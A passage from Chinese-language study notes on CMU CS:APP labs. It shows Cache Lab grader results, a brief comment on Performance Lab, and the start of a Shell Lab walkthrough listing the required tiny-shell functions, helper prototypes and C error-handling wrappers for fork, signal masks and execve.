</span><span id=__span-142-13><a id=__codelineno-142-13 name=__codelineno-142-13></a><span class=w>     </span><span class=m>6</span><span class=w> </span><span class=o>(</span><span class=m>5</span>,1,5<span class=o>)</span><span class=w> </span><span class=m>265189</span><span class=w>   </span><span class=m>21775</span><span class=w>   </span><span class=m>21743</span><span class=w>  </span><span class=m>265189</span><span class=w>   </span><span class=m>21775</span><span class=w>   </span><span class=m>21743</span><span class=w>  </span>traces/long.trace
</span><span id=__span-142-14><a id=__codelineno-142-14 name=__codelineno-142-14></a><span class=w>     </span><span class=m>27</span>
</span><span id=__span-142-15><a id=__codelineno-142-15 name=__codelineno-142-15></a>
</span><span id=__span-142-16><a id=__codelineno-142-16 name=__codelineno-142-16></a>
</span><span id=__span-142-17><a id=__codelineno-142-17 name=__codelineno-142-17></a>Part<span class=w> </span>B:<span class=w> </span>Testing<span class=w> </span>transpose<span class=w> </span><span class=k>function</span>
</span><span id=__span-142-18><a id=__codelineno-142-18 name=__codelineno-142-18></a>Running<span class=w> </span>./test-trans<span class=w> </span>-M<span class=w> </span><span class=m>32</span><span class=w> </span>-N<span class=w> </span><span class=m>32</span>
</span><span id=__span-142-19><a id=__codelineno-142-19 name=__codelineno-142-19></a>Running<span class=w> </span>./test-trans<span class=w> </span>-M<span class=w> </span><span class=m>64</span><span class=w> </span>-N<span class=w> </span><span class=m>64</span>
</span><span id=__span-142-20><a id=__codelineno-142-20 name=__codelineno-142-20></a>Running<span class=w> </span>./test-trans<span class=w> </span>-M<span class=w> </span><span class=m>61</span><span class=w> </span>-N<span class=w> </span><span class=m>67</span>
</span><span id=__span-142-21><a id=__codelineno-142-21 name=__codelineno-142-21></a>
</span><span id=__span-142-22><a id=__codelineno-142-22 name=__codelineno-142-22></a>Cache<span class=w> </span>Lab<span class=w> </span>summary:
</span><span id=__span-142-23><a id=__codelineno-142-23 name=__codelineno-142-23></a><span class=w>                        </span>Points<span class=w>   </span>Max<span class=w> </span>pts<span class=w>      </span>Misses
</span><span id=__span-142-24><a id=__codelineno-142-24 name=__codelineno-142-24></a>Csim<span class=w> </span>correctness<span class=w>          </span><span class=m>27</span>.0<span class=w>        </span><span class=m>27</span>
</span><span id=__span-142-25><a id=__codelineno-142-25 name=__codelineno-142-25></a>Trans<span class=w> </span>perf<span class=w> </span>32x32<span class=w>           </span><span class=m>8</span>.0<span class=w>         </span><span class=m>8</span><span class=w>         </span><span class=m>288</span>
</span><span id=__span-142-26><a id=__codelineno-142-26 name=__codelineno-142-26></a>Trans<span class=w> </span>perf<span class=w> </span>64x64<span class=w>           </span><span class=m>8</span>.0<span class=w>         </span><span class=m>8</span><span class=w>        </span><span class=m>1228</span>
</span><span id=__span-142-27><a id=__codelineno-142-27 name=__codelineno-142-27></a>Trans<span class=w> </span>perf<span class=w> </span>61x67<span class=w>          </span><span class=m>10</span>.0<span class=w>        </span><span class=m>10</span><span class=w>        </span><span class=m>1993</span>
</span><span id=__span-142-28><a id=__codelineno-142-28 name=__codelineno-142-28></a><span class=w>          </span>Total<span class=w> </span>points<span class=w>    </span><span class=m>53</span>.0<span class=w>        </span><span class=m>53</span>
</span></code></pre></div></td></tr></table></div> </li> </ol> <h2 id=performance-lab>Performance Lab<a class=headerlink href=#performance-lab title="Permanent link">¶</a></h2> <ol> <li>在 CMU，这个实验已经被 Cache Lab 取代了，含金量不高，相比其他实验也粗糙了很多。如果还没有做 Cache Lab，可以把这个 Lab 当作一个小练习；如果已经做了，那么建议跳过这个实验。实验参考在<a href=https://zhuanlan.zhihu.com/p/488141606>这里</a>。</li> </ol> <h2 id=shell-lab>Shell Lab<a class=headerlink href=#shell-lab title="Permanent link">¶</a></h2> <ol> <li> <h3 id=_12>实验概览<a class=headerlink href=#_12 title="Permanent link">¶</a></h3> <p>Shell Lab 要求实现一个带有作业控制的 Unix Shell 程序(修改<code>tsh.c</code>)，需要考虑基础的并发，进程控制以及信号和信号处理。需要我们实现的函数：</p> <ul> <li><code>eval</code>：解析命令行 [约 70 行]</li> <li><code>builtin_cmd</code>：检测是否为内置命令<code>quit</code>、<code>fg</code>、<code>bg</code>、<code>jobs</code>[约 25 行]</li> <li><code>do_bgfg</code>：实现内置命令<code>bg</code>和<code>fg</code>[约 50 行]</li> <li><code>waitfg</code>：等待前台作业执行完成 [约 20 行]</li> <li><code>sigchld_handler</code>：处理<code>SIGCHLD</code>信号，即子进程停止或者终止 [约 80 行]</li> <li><code>sigint_handler</code>：处理<code>SIGINT</code>信号，即来自键盘的中断ctrl-c [约 15 行]</li> <li><code>sigtstp_handler</code>：处理<code>SIGTSTP</code>信号，即来自终端的停止信号 [约 15 行]</li> </ul> <p>作者提供的帮助函数及功能：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-143-1> 1</a></span>
<span class=normal><a href=#__codelineno-143-2> 2</a></span>
<span class=normal><a href=#__codelineno-143-3> 3</a></span>
<span class=normal><a href=#__codelineno-143-4> 4</a></span>
<span class=normal><a href=#__codelineno-143-5> 5</a></span>
<span class=normal><a href=#__codelineno-143-6> 6</a></span>
<span class=normal><a href=#__codelineno-143-7> 7</a></span>
<span class=normal><a href=#__codelineno-143-8> 8</a></span>
<span class=normal><a href=#__codelineno-143-9> 9</a></span>
<span class=normal><a href=#__codelineno-143-10>10</a></span>
<span class=normal><a href=#__codelineno-143-11>11</a></span>
<span class=normal><a href=#__codelineno-143-12>12</a></span>
<span class=normal><a href=#__codelineno-143-13>13</a></span>
<span class=normal><a href=#__codelineno-143-14>14</a></span>
<span class=normal><a href=#__codelineno-143-15>15</a></span>
<span class=normal><a href=#__codelineno-143-16>16</a></span>
<span class=normal><a href=#__codelineno-143-17>17</a></span>
<span class=normal><a href=#__codelineno-143-18>18</a></span>
<span class=normal><a href=#__codelineno-143-19>19</a></span>
<span class=normal><a href=#__codelineno-143-20>20</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-143-1><a id=__codelineno-143-1 name=__codelineno-143-1></a><span class=cm>/* Here are helper routines that we've provided for you */</span>
</span><span id=__span-143-2><a id=__codelineno-143-2 name=__codelineno-143-2></a><span class=kt>int</span><span class=w> </span><span class=nf>parseline</span><span class=p>(</span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>cmdline</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>);</span><span class=w>  </span><span class=c1>// 解析命令行参数，如果后台运行则返回 1</span>
</span><span id=__span-143-3><a id=__codelineno-143-3 name=__codelineno-143-3></a><span class=kt>void</span><span class=w> </span><span class=nf>sigquit_handler</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>sig</span><span class=p>);</span>
</span><span id=__span-143-4><a id=__codelineno-143-4 name=__codelineno-143-4></a>
</span><span id=__span-143-5><a id=__codelineno-143-5 name=__codelineno-143-5></a><span class=kt>void</span><span class=w> </span><span class=nf>clearjob</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>job</span><span class=p>);</span><span class=w>                 </span><span class=c1>// 清除job结构体</span>
</span><span id=__span-143-6><a id=__codelineno-143-6 name=__codelineno-143-6></a><span class=kt>void</span><span class=w> </span><span class=nf>initjobs</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>jobs</span><span class=p>);</span><span class=w>                </span><span class=c1>// 初始化jobs列表</span>
</span><span id=__span-143-7><a id=__codelineno-143-7 name=__codelineno-143-7></a><span class=kt>int</span><span class=w> </span><span class=nf>maxjid</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>jobs</span><span class=p>);</span><span class=w>                   </span><span class=c1>// 返回jobs列表中jid最大值</span>
</span><span id=__span-143-8><a id=__codelineno-143-8 name=__codelineno-143-8></a><span class=kt>int</span><span class=w> </span><span class=nf>addjob</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>state</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>cmdline</span><span class=p>);</span><span class=w>    </span><span class=c1>// 在jobs列表中添加job</span>
</span><span id=__span-143-9><a id=__codelineno-143-9 name=__codelineno-143-9></a><span class=kt>int</span><span class=w> </span><span class=nf>deletejob</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>);</span><span class=w>     </span><span class=c1>// 在jobs列表中删除pid对应的job</span>
</span><span id=__span-143-10><a id=__codelineno-143-10 name=__codelineno-143-10></a><span class=kt>pid_t</span><span class=w> </span><span class=nf>fgpid</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>jobs</span><span class=p>);</span><span class=w>                  </span><span class=c1>// 返回前台运行的job的pid</span>
</span><span id=__span-143-11><a id=__codelineno-143-11 name=__codelineno-143-11></a><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>getjobpid</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>);</span><span class=w> </span><span class=c1>// 返回对应pid的job</span>
</span><span id=__span-143-12><a id=__codelineno-143-12 name=__codelineno-143-12></a><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>getjobjid</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>jid</span><span class=p>);</span><span class=w>   </span><span class=c1>// 返回对应jid的job</span>
</span><span id=__span-143-13><a id=__codelineno-143-13 name=__codelineno-143-13></a><span class=kt>int</span><span class=w> </span><span class=nf>pid2jid</span><span class=p>(</span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>);</span><span class=w>             </span><span class=c1>// 返回对应pid的job的jid</span>
</span><span id=__span-143-14><a id=__codelineno-143-14 name=__codelineno-143-14></a><span class=kt>void</span><span class=w> </span><span class=nf>listjobs</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>job_t</span><span class=w> </span><span class=o>*</span><span class=n>jobs</span><span class=p>);</span><span class=w>  </span><span class=c1>// 打印jobs列表</span>
</span><span id=__span-143-15><a id=__codelineno-143-15 name=__codelineno-143-15></a>
</span><span id=__span-143-16><a id=__codelineno-143-16 name=__codelineno-143-16></a><span class=kt>void</span><span class=w> </span><span class=nf>usage</span><span class=p>(</span><span class=kt>void</span><span class=p>);</span><span class=w>                   </span><span class=c1>// 帮助信息</span>
</span><span id=__span-143-17><a id=__codelineno-143-17 name=__codelineno-143-17></a><span class=kt>void</span><span class=w> </span><span class=nf>unix_error</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>msg</span><span class=p>);</span><span class=w>         </span><span class=c1>// 错误信息</span>
</span><span id=__span-143-18><a id=__codelineno-143-18 name=__codelineno-143-18></a><span class=kt>void</span><span class=w> </span><span class=nf>app_error</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>msg</span><span class=p>);</span>
</span><span id=__span-143-19><a id=__codelineno-143-19 name=__codelineno-143-19></a><span class=k>typedef</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>handler_t</span><span class=p>(</span><span class=kt>int</span><span class=p>);</span>
</span><span id=__span-143-20><a id=__codelineno-143-20 name=__codelineno-143-20></a><span class=n>handler_t</span><span class=w> </span><span class=o>*</span><span class=nf>Signal</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>signum</span><span class=p>,</span><span class=w> </span><span class=n>handler_t</span><span class=w> </span><span class=o>*</span><span class=n>handler</span><span class=p>);</span>
</span></code></pre></div></td></tr></table></div> <p>CMU 文档的一些说明与要求：</p> <ul> <li>Shell 的提示标记符为 "tsh&gt; "</li> <li>用户键入的命令行应包括命令名称和 0 个或多个参数，所有参数以一个或多个空格分隔。如果 name 是一个内置命令，则 tsh 应该立即处理它并等待下一个命令行。否则，tsh 假定该名称是一个可执行程序的路径，并在一个初始子进程的上下文中加载并运行</li> <li>tsh 不需要支持管道（|）或 I/O 重定向（&lt; 和 &gt;）</li> <li>键入 ctrl-c（ctrl-z）应该会发送一个 SIGINT（SIGTSTP）信号给当前的前台作业以及它的子进程。如果没有前台作业，则该信号应该没有任何作用</li> <li>如果命令行以 &amp; 结束，则 tsh 应该在后台运行该作业。否则，它应该在前台运行</li> <li>每个作业都可以由一个进程 ID（PID）或一个作业 ID（JID）标识，该 ID 是一个由 tsh 分配的正整数。JID应该在命令行上以前缀 "%" 表示。例如，"%5" 表示 JID 5，"5" 表示 PID 5</li> <li>tsh 应该支持以下内置命令：<ul> <li>quit：终止 tsh 程序。</li> <li>jobs：列出所有后台作业</li> <li>bg ：向作业发送 SIGCONT 信号来重新启动 ，然后在后台运行</li> <li>fg ：向作业发送 SIGCONT 信号来重新启动 ，然后在前台运行</li> </ul> </li> <li>tsh 必须回收所有的僵死进程</li> </ul> </li> <li> <h3 id=_13>错误处理包装函数<a class=headerlink href=#_13 title="Permanent link">¶</a></h3> <p>当 Unix 系统及函数遇到错误时，它们通常会返回 -1，并设置全局整型变量errno来表示什么出错了。为了能让程序检查错误的同时代码不那么臃肿，按照书本推荐的方式，编写一套后面将要用到的错误处理包装函数:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-144-1> 1</a></span>
<span class=normal><a href=#__codelineno-144-2> 2</a></span>
<span class=normal><a href=#__codelineno-144-3> 3</a></span>
<span class=normal><a href=#__codelineno-144-4> 4</a></span>
<span class=normal><a href=#__codelineno-144-5> 5</a></span>
<span class=normal><a href=#__codelineno-144-6> 6</a></span>
<span class=normal><a href=#__codelineno-144-7> 7</a></span>
<span class=normal><a href=#__codelineno-144-8> 8</a></span>
<span class=normal><a href=#__codelineno-144-9> 9</a></span>
<span class=normal><a href=#__codelineno-144-10>10</a></span>
<span class=normal><a href=#__codelineno-144-11>11</a></span>
<span class=normal><a href=#__codelineno-144-12>12</a></span>
<span class=normal><a href=#__codelineno-144-13>13</a></span>
<span class=normal><a href=#__codelineno-144-14>14</a></span>
<span class=normal><a href=#__codelineno-144-15>15</a></span>
<span class=normal><a href=#__codelineno-144-16>16</a></span>
<span class=normal><a href=#__codelineno-144-17>17</a></span>
<span class=normal><a href=#__codelineno-144-18>18</a></span>
<span class=normal><a href=#__codelineno-144-19>19</a></span>
<span class=normal><a href=#__codelineno-144-20>20</a></span>
<span class=normal><a href=#__codelineno-144-21>21</a></span>
<span class=normal><a href=#__codelineno-144-22>22</a></span>
<span class=normal><a href=#__codelineno-144-23>23</a></span>
<span class=normal><a href=#__codelineno-144-24>24</a></span>
<span class=normal><a href=#__codelineno-144-25>25</a></span>
<span class=normal><a href=#__codelineno-144-26>26</a></span>
<span class=normal><a href=#__codelineno-144-27>27</a></span>
<span class=normal><a href=#__codelineno-144-28>28</a></span>
<span class=normal><a href=#__codelineno-144-29>29</a></span>
<span class=normal><a href=#__codelineno-144-30>30</a></span>
<span class=normal><a href=#__codelineno-144-31>31</a></span>
<span class=normal><a href=#__codelineno-144-32>32</a></span>
<span class=normal><a href=#__codelineno-144-33>33</a></span>
<span class=normal><a href=#__codelineno-144-34>34</a></span>
<span class=normal><a href=#__codelineno-144-35>35</a></span>
<span class=normal><a href=#__codelineno-144-36>36</a></span>
<span class=normal><a href=#__codelineno-144-37>37</a></span>
<span class=normal><a href=#__codelineno-144-38>38</a></span>
<span class=normal><a href=#__codelineno-144-39>39</a></span>
<span class=normal><a href=#__codelineno-144-40>40</a></span>
<span class=normal><a href=#__codelineno-144-41>41</a></span>
<span class=normal><a href=#__codelineno-144-42>42</a></span>
<span class=normal><a href=#__codelineno-144-43>43</a></span>
<span class=normal><a href=#__codelineno-144-44>44</a></span>
<span class=normal><a href=#__codelineno-144-45>45</a></span>
<span class=normal><a href=#__codelineno-144-46>46</a></span>
<span class=normal><a href=#__codelineno-144-47>47</a></span>
<span class=normal><a href=#__codelineno-144-48>48</a></span>
<span class=normal><a href=#__codelineno-144-49>49</a></span>
<span class=normal><a href=#__codelineno-144-50>50</a></span>
<span class=normal><a href=#__codelineno-144-51>51</a></span>
<span class=normal><a href=#__codelineno-144-52>52</a></span>
<span class=normal><a href=#__codelineno-144-53>53</a></span>
<span class=normal><a href=#__codelineno-144-54>54</a></span>
<span class=normal><a href=#__codelineno-144-55>55</a></span>
<span class=normal><a href=#__codelineno-144-56>56</a></span>
<span class=normal><a href=#__codelineno-144-57>57</a></span>
<span class=normal><a href=#__codelineno-144-58>58</a></span>
<span class=normal><a href=#__codelineno-144-59>59</a></span>
<span class=normal><a href=#__codelineno-144-60>60</a></span>
<span class=normal><a href=#__codelineno-144-61>61</a></span>
<span class=normal><a href=#__codelineno-144-62>62</a></span>
<span class=normal><a href=#__codelineno-144-63>63</a></span>
<span class=normal><a href=#__codelineno-144-64>64</a></span>
<span class=normal><a href=#__codelineno-144-65>65</a></span>
<span class=normal><a href=#__codelineno-144-66>66</a></span>
<span class=normal><a href=#__codelineno-144-67>67</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-144-1><a id=__codelineno-144-1 name=__codelineno-144-1></a><span class=cm>/* Error wrapper function */</span>
</span><span id=__span-144-2><a id=__codelineno-144-2 name=__codelineno-144-2></a><span class=kt>pid_t</span><span class=w> </span><span class=nf>Fork</span><span class=p>(</span><span class=kt>void</span><span class=p>);</span>
</span><span id=__span-144-3><a id=__codelineno-144-3 name=__codelineno-144-3></a><span class=kt>void</span><span class=w> </span><span class=nf>Sigprocmask</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>how</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>set</span><span class=p>,</span><span class=w> </span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>oldset</span><span class=p>);</span>
</span><span id=__span-144-4><a id=__codelineno-144-4 name=__codelineno-144-4></a><span class=kt>void</span><span class=w> </span><span class=nf>Sigemptyset</span><span class=p>(</span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>set</span><span class=p>);</span>
</span><span id=__span-144-5><a id=__codelineno-144-5 name=__codelineno-144-5></a><span class=kt>void</span><span class=w> </span><span class=nf>Sigfillset</span><span class=p>(</span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>set</span><span class=p>);</span>
</span><span id=__span-144-6><a id=__codelineno-144-6 name=__codelineno-144-6></a><span class=kt>void</span><span class=w> </span><span class=nf>Sigaddset</span><span class=p>(</span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>set</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>signum</span><span class=p>);</span>
</span><span id=__span-144-7><a id=__codelineno-144-7 name=__codelineno-144-7></a><span class=kt>void</span><span class=w> </span><span class=nf>Execve</span><span class=p>(</span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=k>const</span><span class=w> </span><span class=n>argv</span><span class=p>[],</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=k>const</span><span class=w> </span><span class=n>envp</span><span class=p>[]);</span>
</span><span id=__span-144-8><a id=__codelineno-144-8 name=__codelineno-144-8></a><span class=kt>void</span><span class=w> </span><span class=nf>Setpgid</span><span class=p>(</span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=kt>pid_t</span><span class=w> </span><span class=n>pgid</span><span class=p>);</span>
</span><span id=__span-144-9><a id=__codelineno-144-9 name=__codelineno-144-9></a><span class=kt>void</span><span class=w> </span><span class=nf>Kill</span><span class=p>(</span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>sig</span><span class=p>);</span>
</span><span id=__span-144-10><a id=__codelineno-144-10 name=__codelineno-144-10></a><span class=kt>pid_t</span><span class=w> </span><span class=nf>Fork</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span><span id=__span-144-11><a id=__codelineno-144-11 name=__codelineno-144-11></a><span class=p>{</span>
</span><span id=__span-144-12><a id=__codelineno-144-12 name=__codelineno-144-12></a><span class=w>    </span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>;</span>
</span><span id=__span-144-13><a id=__codelineno-144-13 name=__codelineno-144-13></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fork</span><span class=p>())</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-144-14><a id=__codelineno-144-14 name=__codelineno-144-14></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-144-15><a id=__codelineno-144-15 name=__codelineno-144-15></a><span class=w>        </span><span class=n>unix_error</span><span class=p>(</span><span class=s>"Fork error"</span><span class=p>);</span>
</span><span id=__span-144-16><a id=__codelineno-144-16 name=__codelineno-144-16></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-144-17><a id=__codelineno-144-17 name=__codelineno-144-17></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>pid</span><span class=p>;</span>
</span><span id=__span-144-18><a id=__codelineno-144-18 name=__codelineno-144-18></a><span class=p>}</span>
</span><span id=__span-144-19><a id=__codelineno-144-19 name=__codelineno-144-19></a><span class=kt>void</span><span class=w> </span><span class=nf>Sigprocmask</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>how</span><span class=p>,</span><span class=w> </span><span class=k>const</span><span class=w> </span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>set</span><span class=p>,</span><span class=w> </span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>oldset</span><span class=p>)</span>
</span><span id=__span-144-20><a id=__codelineno-144-20 name=__codelineno-144-20></a><span class=p>{</span>
</span><span id=__span-144-21><a id=__codelineno-144-21 name=__codelineno-144-21></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sigprocmask</span><span class=p>(</span><span class=n>how</span><span class=p>,</span><span class=w> </span><span class=n>set</span><span class=p>,</span><span class=w> </span><span class=n>oldset</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-144-22><a id=__codelineno-144-22 name=__codelineno-144-22></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-144-23><a id=__codelineno-144-23 name=__codelineno-144-23></a><span class=w>        </span><span class=n>unix_error</span><span class=p>(</span><span class=s>"Sigprocmask error"</span><span class=p>);</span>
</span><span id=__span-144-24><a id=__codelineno-144-24 name=__codelineno-144-24></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-144-25><a id=__codelineno-144-25 name=__codelineno-144-25></a><span class=p>}</span>
</span><span id=__span-144-26><a id=__codelineno-144-26 name=__codelineno-144-26></a><span class=kt>void</span><span class=w> </span><span class=nf>Sigemptyset</span><span class=p>(</span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>set</span><span class=p>)</span>
</span><span id=__span-144-27><a id=__codelineno-144-27 name=__codelineno-144-27></a><span class=p>{</span>
</span><span id=__span-144-28><a id=__codelineno-144-28 name=__codelineno-144-28></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sigemptyset</span><span class=p>(</span><span class=n>set</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-144-29><a id=__codelineno-144-29 name=__codelineno-144-29></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-144-30><a id=__codelineno-144-30 name=__codelineno-144-30></a><span class=w>        </span><span class=n>unix_error</span><span class=p>(</span><span class=s>"Sigemptyset error"</span><span class=p>);</span>
</span><span id=__span-144-31><a id=__codelineno-144-31 name=__codelineno-144-31></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-144-32><a id=__codelineno-144-32 name=__codelineno-144-32></a><span class=p>}</span>
</span><span id=__span-144-33><a id=__codelineno-144-33 name=__codelineno-144-33></a><span class=kt>void</span><span class=w> </span><span class=nf>Sigfillset</span><span class=p>(</span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>set</span><span class=p>)</span>
</span><span id=__span-144-34><a id=__codelineno-144-34 name=__codelineno-144-34></a><span class=p>{</span>
</span><span id=__span-144-35><a id=__codelineno-144-35 name=__codelineno-144-35></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sigfillset</span><span class=p>(</span><span class=n>set</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-144-36><a id=__codelineno-144-36 name=__codelineno-144-36></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-144-37><a id=__codelineno-144-37 name=__codelineno-144-37></a><span class=w>        </span><span class=n>unix_error</span><span class=p>(</span><span class=s>"Sigfillset error"</span><span class=p>);</span>
</span><span id=__span-144-38><a id=__codelineno-144-38 name=__codelineno-144-38></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-144-39><a id=__codelineno-144-39 name=__codelineno-144-39></a><span class=p>}</span>
</span><span id=__span-144-40><a id=__codelineno-144-40 name=__codelineno-144-40></a><span class=kt>void</span><span class=w> </span><span class=nf>Sigaddset</span><span class=p>(</span><span class=kt>sigset_t</span><span class=w> </span><span class=o>*</span><span class=n>set</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>signum</span><span class=p>)</span>
</span><span id=__span-144-41><a id=__codelineno-144-41 name=__codelineno-144-41></a><span class=p>{</span>
</span><span id=__span-144-42><a id=__codelineno-144-42 name=__codelineno-144-42></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sigaddset</span><span class=p>(</span><span class=n>set</span><span class=p>,</span><span class=w> </span><span class=n>signum</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-144-43><a id=__codelineno-144-43 name=__codelineno-144-43></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-144-44><a id=__codelineno-144-44 name=__codelineno-144-44></a><span class=w>        </span><span class=n>unix_error</span><span class=p>(</span><span class=s>"Sigaddset error"</span><span class=p>);</span>
</span><span id=__span-144-45><a id=__codelineno-144-45 name=__codelineno-144-45></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-144-46><a id=__codelineno-144-46 name=__codelineno-144-46></a><span class=p>}</span>
</span><span id=__span-144-47><a id=__codelineno-144-47 name=__codelineno-144-47></a><span class=kt>void</span><span class=w> </span><span class=nf>Execve</span><span class=p>(</span><span class=k>const</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=k>const</span><span class=w> </span><span class=n>argv</span><span class=p>[],</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=k>const</span><span class=w> </span><span class=n>envp</span><span class=p>[])</span>
</span><span id=__span-144-48><a id=__codelineno-144-48 name=__codelineno-144-48></a><span class=p>{</span>
</span><span id=__span-144-49><a id=__codelineno-144-49 name=__codelineno-144-49></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>execve</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=n>envp</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-144-50><a id=__codelineno-144-50 name=__codelineno-144-50></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-144-51><a id=__codelineno-144-51 name=__codelineno-144-51></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"%s: Command not found.</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span><span id=__span-144-52><a id=__codelineno-144-52 name=__codelineno-144-52></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-144-53><a id=__codelineno-144-53 name=__codelineno-144-53></a><span class=p>}</span>
